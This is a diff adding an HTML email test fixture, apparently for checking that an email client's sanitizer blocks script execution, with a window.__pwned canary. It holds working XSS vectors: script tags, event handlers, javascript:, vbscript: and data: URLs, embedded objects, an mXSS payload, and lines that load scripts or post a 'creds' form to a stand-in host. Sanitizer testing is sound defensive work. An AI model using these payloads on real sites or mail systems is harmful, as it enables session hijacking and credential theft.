@@ -1,0 +1,38 @@
+From: Attacker <mallory@evil.example>
+To: todd@corp.example
+Subject: Script execution - none of this may run
+Date: Tue, 11 Aug 2026 11:30:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>If any payload runs, window.__pwned becomes 1.</p>
+
+<script>window.__pwned = 1; window.parent.postMessage({stolen:true},'*');</script>
+<script src="http://127.0.0.1:8099/evil.js"></script>
+
+<img src=x onerror="window.__pwned=1">
+<svg onload="window.__pwned=1"></svg>
+<body onload="window.__pwned=1">
+<div onclick="window.__pwned=1" onmouseover="window.__pwned=1">hover me</div>
+
+<a href="javascript:window.__pwned=1">javascript: link</a>
+<a href="vbscript:msgbox(1)">vbscript: link</a>
+<a href="data:text/html,<script>window.__pwned=1</script>">data: link</a>
+
+<iframe src="javascript:window.__pwned=1"></iframe>
+<object data="http://127.0.0.1:8099/evil.swf"></object>
+<embed src="http://127.0.0.1:8099/evil.swf">
+<base href="http://127.0.0.1:8099/">
+<meta http-equiv="refresh" content="0;url=http://127.0.0.1:8099/redirect">
+
+<form action="http://127.0.0.1:8099/steal" method="post">
+  <input name="creds" value="secret"><button type="submit">Submit</button>
+</form>
+
+<p>mXSS classic:</p>
+<math><mtext><table><mglyph><style><!--</style><img src onerror="window.__pwned=1">
+
+<p>Style-based:</p>
+<style>@import 'http://127.0.0.1:8099/import.css'; body{background:url(http://127.0.0.1:8099/style.png)}</style>
+</body></html>
